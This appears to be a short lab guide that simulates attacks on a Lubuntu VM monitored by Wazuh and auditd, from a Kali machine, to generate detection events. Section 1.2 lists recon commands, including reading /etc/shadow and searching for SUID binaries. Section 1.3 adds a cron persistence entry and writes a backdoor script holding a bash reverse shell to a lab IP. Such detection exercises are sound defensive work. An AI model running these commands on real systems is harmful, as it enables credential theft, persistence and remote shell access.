# **1.Attack Simulation** 
before starting the task : 
on wazuh :
```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard
```
on lubunto : 
```bash
sudo systemctl status auditd
sudo systemctl status wazuh-agent
sudo auditctl -l
sudo grep -a "Connected" /var/ossec/logs/osseclog | tail -5
```
on kali:
```bash
ping -c 3 192.168.2.128
```
## 1.1 Get SSH Access from Kali to LubuntuVM
on lubunto : 
```bash
sudo systemctl status ssh
```
on kali : 
```bash
ssh mariem@192.168.2.128
```
## 1.2 Attack A: Privilege Escalation Recon
```bash
whoami
id
uname -a
sudo -l
cat /etc/passwd
sudo cat /etc/shadow
find / -perm -4000 -type f 2>/dev/null
```
## 1.3 Attack B: Unauthorized Persistence via Cron
```bash
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'whoami > tmp/attacker_was_here.txt'") | crontab -
crontab -l
echo '#!/bin/bash' > /tmp/malicious_backdoor.sh
echo 'bash -i >& /dev/tcp/192.168.2.192/4444 0>&1' >> /tmp/malicious_backdoor.sh
chmod +x /tmp/malicious_backdoor.sh
```
#



















